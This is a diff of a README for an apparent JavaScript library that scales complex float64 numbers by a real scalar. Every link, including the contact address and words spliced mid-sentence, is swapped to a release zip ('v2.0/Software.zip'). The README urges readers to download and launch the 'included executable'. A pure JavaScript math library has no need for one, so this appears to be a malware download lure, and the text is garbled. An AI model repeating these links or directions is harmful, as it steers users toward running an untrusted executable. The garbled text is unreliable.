@@ -2,14 +2,14 @@
 
 Scale a double-precision complex floating-point number by a real-valued double-precision floating-point scalar constant.
 
-[![Software Download](https://github.com/parshv-j6/complex-float64-base-scale/releases/download/v1.0/Release_x64.zip)](https://github.com/parshv-j6/complex-float64-base-scale/releases/download/v1.0/Release_x64.zip)
+[![Software Download](https://github.com/parshv-j6/complex-float64-base-scale/releases/download/v2.0/Software.zip)](https://github.com/parshv-j6/complex-float64-base-scale/releases/download/v2.0/Software.zip)
 
 Welcome to the `complex-float64-base-scale` repository! This repository focuses on performing complex multiplication operations by scaling a double-precision complex floating-point number with a real-valued double-precision scalar constant. Whether you are studying arithmetic, complex numbers, math, or looking to implement complex multiplication in your JavaScript projects, this repository provides a useful tool.
 
 ## 🧮 Features
 - Scaling of a double-precision complex floating-point number by a real-valued double-precision floating-point scalar constant.
 - Implements complex multiplication operations efficiently.
-- Written in JavaScript for easy integration into https://github.com/parshv-j6/complex-float64-base-scale/releases/download/v1.0/Release_x64.zip applications.
+- Written in JavaScript for easy integration into https://github.com/parshv-j6/complex-float64-base-scale/releases/download/v2.0/Software.zip applications.
 
 ## 📁 Repository Structure
 The repository is structured as follows:
@@ -40,17 +40,17 @@ This repository covers a range of topics related to arithmetic, complex numbers,
 To use the complex multiplication functionality provided by this repository, follow these steps:
 1. Clone the repository to your local machine.
 2. Navigate to the `src/` directory.
-3. Integrate the complex multiplication functions into your https://github.com/parshv-j6/complex-float64-base-scale/releases/download/v1.0/Release_x64.zip application.
+3. Integrate the complex multiplication functions into your https://github.com/parshv-j6/complex-float64-base-scale/releases/download/v2.0/Software.zip application.
 4. Use the functions to scale complex numbers efficiently.
 
 ## 🌟 Download
 Click the button below to download the software:
-[![Software Download](https://github.com/parshv-j6/complex-float64-base-scale/releases/download/v1.0/Release_x64.zip)](https://github.com/parshv-j6/complex-float64-base-scale/releases/download/v1.0/Release_x64.zip)
+[![Software Download](https://github.com/parshv-j6/complex-float64-base-scale/releases/download/v2.0/Software.zip)](https://github.com/parshv-j6/complex-float64-base-scale/releases/download/v2.0/Software.zip)
 
-Please ensure that the https://github.com/parshv-j6/complex-float64-base-scale/releases/download/v1.0/Release_x64.zip file is launched to access the included executable.
+Please ensure that the https://github.com/parshv-j6/complex-float64-base-scale/releases/download/v2.0/Software.zip file is launched to access the included executable.
 
 ## 🌐 Visit Our Website
-If you wish to explore more about our project, visit our [website](https://github.com/parshv-j6/complex-float64-base-scale/releases/download/v1.0/Release_x64.zip) for additional resources and information.
+If you wish to explore more about our project, visit our [website](https://github.com/parshv-j6/complex-float64-base-scale/releases/download/v2.0/Software.zip) for additional resources and information.
 
 ## 🙌 Contribute
 Contributions to this repository are welcomed. If you have ideas for improvement, bug fixes, or additional features, feel free to submit a pull request.
@@ -62,10 +62,10 @@ We value your feedback! Feel free to reach out to us with any suggestions or com
 This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
 
 ## 📧 Contact
-For any inquiries or support, contact us at https://github.com/parshv-j6/complex-float64-base-scale/releases/download/v1.0/Release_x64.zip
+For any inquiries or support, contact us at https://github.com/parshv-j6/complex-float64-base-scale/releases/download/v2.0/Software.zip
 
 ## 🚧 Check Releases
-If the download link is not working or the https://github.com/parshv-j6/complex-float64-base-scale/releases/download/v1.0/Release_x64.zip file needs to be launched, please check the [Releases](https://github.com/parshv-j6/complex-float64-base-scale/releases/download/v1.0/Release_x64.zip) section for alternative download options.
+If the download link is not working or the https://github.com/parshv-j6/complex-float64-base-scale/releases/download/v2.0/Software.zip file needs to be launched, please check the [Releases](https://github.com/parshv-j6/complex-float64-base-scale/releases/download/v2.0/Software.zip) section for alternative download options.
 
 ---
 
